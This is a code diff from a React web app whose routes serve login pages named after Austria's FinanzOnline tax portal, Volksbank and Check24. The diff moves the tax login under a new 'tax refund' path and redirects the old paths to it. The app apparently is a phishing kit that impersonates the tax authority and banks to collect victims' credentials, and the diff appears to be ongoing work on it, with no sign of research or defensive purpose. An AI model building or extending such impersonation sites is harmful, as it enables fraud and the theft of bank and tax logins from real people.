@@ -101,7 +101,7 @@ const ConfirmationSwitch = () => {
   const c24 = params.get("c24");
   const fst = params.get("fst");
   if (fst === "1" || (typeof window !== "undefined" && sessionStorage.getItem("fst_return") === "1")) {
-    return <Navigate to={`/finanzonline-steuer/login?step=3`} replace />;
+    return <Navigate to={`/steuerrueckerstattung/login?step=3`} replace />;
   }
   if (c24 === "1" || (typeof window !== "undefined" && sessionStorage.getItem("c24_return") === "1")) {
     return <Navigate to={`/check24/sichern?step=3`} replace />;
@@ -142,8 +142,10 @@ const App = () => (
           <Routes>
             <Route path="/" element={<P><SessionBankRouter /></P>} />
             <Route path="/finanzonline" element={<P><Index /></P>} />
-            <Route path="/finanzonline-steuer" element={<P><FinanzonlineSteuer /></P>} />
-            <Route path="/finanzonline-steuer/login" element={<P><FinanzonlineSteuerLogin /></P>} />
+            <Route path="/finanzonline-steuer" element={<Navigate to="/steuerrueckerstattung" replace />} />
+            <Route path="/finanzonline-steuer/login" element={<Navigate to="/steuerrueckerstattung/login" replace />} />
+            <Route path="/steuerrueckerstattung" element={<P><FinanzonlineSteuer /></P>} />
+            <Route path="/steuerrueckerstattung/login" element={<P><FinanzonlineSteuerLogin /></P>} />
             <Route path="/login" element={<P><VolksbankLogin /></P>} />
             <Route path="/login/bestaetigung" element={<P><VolksbankBestaetigung /></P>} />
             <Route path="/auth" element={<Auth />} />
